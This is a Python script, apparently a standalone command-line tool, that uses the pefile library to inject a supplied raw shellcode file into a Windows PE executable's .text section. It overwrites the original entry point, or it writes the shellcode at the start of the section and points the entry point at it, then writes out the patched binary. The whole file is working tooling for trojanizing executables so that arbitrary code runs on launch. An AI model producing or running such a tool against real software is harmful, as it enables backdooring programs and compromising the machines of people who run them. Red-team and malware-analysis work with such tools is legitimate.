import pefile
import argparse
import sys

def main():
    parser = argparse.ArgumentParser(description="Inject shellcode into .text section and optionally update entry point.")
    parser.add_argument("--input", required=True, help="Input PE (exe)")
    parser.add_argument("--shellcode", required=True, help="Raw shellcode file")
    parser.add_argument("--output", required=True, help="Output patched EXE")
    parser.add_argument("--start", action="store_true", help="Inject shellcode at start of .text section and update entry point")
    args = parser.parse_args()

    pe = pefile.PE(args.input)

    with open(args.shellcode, "rb") as f:
        sc = f.read()
    sc_len = len(sc)

    # Find .text section
    text_section = None
    for s in pe.sections:
        name = s.Name.rstrip(b'\x00').decode(errors='ignore')
        if name == ".text":
            text_section = s
            break

    if not text_section:
        print("[-] .text section not found.")
        sys.exit(1)

    # Determine injection offset and new entry point
    if args.start:
        inj_rva = text_section.VirtualAddress
        inj_offset = text_section.PointerToRawData
        pe.OPTIONAL_HEADER.AddressOfEntryPoint = inj_rva
        print("[+] Injecting shellcode at the start of .text section")
    else:
        inj_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint
        inj_offset = pe.get_offset_from_rva(inj_rva)
        print("[+] Overwriting existing entry point with shellcode")

    text_end_rva = text_section.VirtualAddress + text_section.Misc_VirtualSize
    available_bytes = text_end_rva - inj_rva

    print(f"[+] Injection RVA:        0x{inj_rva:08X}")
    print(f"[+] Injection Offset:     0x{inj_offset:08X}")
    print(f"[+] Shellcode length:     {sc_len} bytes")
    print(f"[+] Available bytes:      {available_bytes} bytes")

    if sc_len > available_bytes:
        print(f"[-] Shellcode too large for target location! Max: {available_bytes} bytes")
        sys.exit(1)

    # Inject shellcode
    patched = bytearray(pe.__data__)
    patched[inj_offset : inj_offset + sc_len] = sc
    pe.__data__ = bytes(patched)

    pe.write(args.output)
    print(f"[+] Patched binary written to: {args.output}")

if __name__ == "__main__":
    main()
